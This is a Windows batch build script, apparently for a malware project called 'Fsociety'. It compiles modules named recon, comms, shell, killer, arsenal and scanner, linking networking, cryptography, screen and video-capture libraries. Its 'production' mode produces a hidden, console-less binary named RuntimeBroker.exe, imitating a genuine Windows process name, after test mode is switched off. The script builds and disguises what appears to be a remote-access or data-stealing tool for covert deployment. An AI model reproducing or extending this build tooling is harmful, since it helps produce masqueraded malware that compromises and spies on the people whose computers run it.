@echo off
echo [*] Fsociety C++ Build System
echo.

:: Check if g++ exists
where g++ >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] ERROR: g++ not found. Install MinGW-w64 first.
    pause
    exit /b 1
)

if "%1"=="release" goto release
if "%1"=="clean" goto clean

:: Default: TEST build (with console window for debugging)
echo [*] Building TEST mode (console visible)...
gcc -c sqlite3.c -O2
g++ -o test.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17
if %errorlevel% equ 0 (
    echo [+] Build SUCCESS: test.exe
    echo [*] Run: .\test.exe
) else (
    echo [!] Build FAILED
)
goto end

:release
:: PRODUCTION build (no console, fully hidden)
echo [*] Building PRODUCTION mode (hidden, no console)...
echo [!] WARNING: Make sure TEST_MODE is set to false in config.h!
gcc -c sqlite3.c -O2
g++ -o RuntimeBroker.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -Os -std=c++17 -mwindows
if %errorlevel% equ 0 (
    echo [+] Build SUCCESS: RuntimeBroker.exe
    for %%A in (RuntimeBroker.exe) do echo [*] Size: %%~zA bytes
) else (
    echo [!] Build FAILED
)
goto end

:clean
echo [*] Cleaning...
del /f test.exe RuntimeBroker.exe 2>nul
echo [+] Clean done.

:end
echo.
